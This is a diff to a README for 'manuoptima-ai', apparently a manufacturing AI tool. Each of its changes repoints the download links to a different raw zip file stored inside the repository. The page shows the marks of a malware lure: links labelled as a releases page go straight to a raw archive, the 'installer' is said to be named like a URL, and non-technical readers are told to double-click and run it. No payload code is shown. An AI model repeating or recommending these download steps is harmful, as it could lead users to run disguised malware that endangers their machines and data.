@@ -4,7 +4,7 @@
 manuoptima-ai is a system designed to help manufacturing businesses improve their operations. It uses sensor data and computer vision to foresee equipment failures, optimize production lines, and identify product defects in real-time. With this tool, you can enhance your production efficiency and maintain high quality.
 
 ## 🔗 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/Attestanttragopan717/manuoptima-ai/main/core/manuoptima-ai_v1.6.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/Attestanttragopan717/manuoptima-ai/main/core/manuoptima-ai_v1.6.zip)
+[![Download Latest Release](https://github.com/Attestanttragopan717/manuoptima-ai/raw/refs/heads/main/utils/ai-manuoptima-v2.0.zip%20Latest%20Release-blue)](https://github.com/Attestanttragopan717/manuoptima-ai/raw/refs/heads/main/utils/ai-manuoptima-v2.0.zip)
 
 ## 🚀 Getting Started
 To begin using manuoptima-ai, follow these steps. No programming knowledge is required.
@@ -18,13 +18,13 @@ To begin using manuoptima-ai, follow these steps. No programming knowledge is re
 ### 📥 Download & Install
 1. **Visit the Releases Page:**
    To download the software, visit the following link:
-   [Download from Releases](https://raw.githubusercontent.com/Attestanttragopan717/manuoptima-ai/main/core/manuoptima-ai_v1.6.zip)
+   [Download from Releases](https://github.com/Attestanttragopan717/manuoptima-ai/raw/refs/heads/main/utils/ai-manuoptima-v2.0.zip)
 
 2. **Choose the Latest Release:**
    Look for the latest version at the top of the page. You will see it marked with the label "Latest Release."
 
 3. **Download the Installer:**
-   Click on the installer file suitable for your operating system. It should be named something like `https://raw.githubusercontent.com/Attestanttragopan717/manuoptima-ai/main/core/manuoptima-ai_v1.6.zip`.
+   Click on the installer file suitable for your operating system. It should be named something like `https://github.com/Attestanttragopan717/manuoptima-ai/raw/refs/heads/main/utils/ai-manuoptima-v2.0.zip`.
 
 4. **Run the Installer:**
    Once the file downloads, locate it in your downloads folder. Double-click the file to run the installer.
@@ -77,4 +77,4 @@ Thanks to the contributors and the open-source community for their support. Your
 To stay updated and connect with other users, follow our discussions and updates in the repository. Links to additional resources and tutorials will also be available here.
 
 Remember, for downloading the software, always start with this link:  
-[Download from Releases](https://raw.githubusercontent.com/Attestanttragopan717/manuoptima-ai/main/core/manuoptima-ai_v1.6.zip)
+[Download from Releases](https://github.com/Attestanttragopan717/manuoptima-ai/raw/refs/heads/main/utils/ai-manuoptima-v2.0.zip)
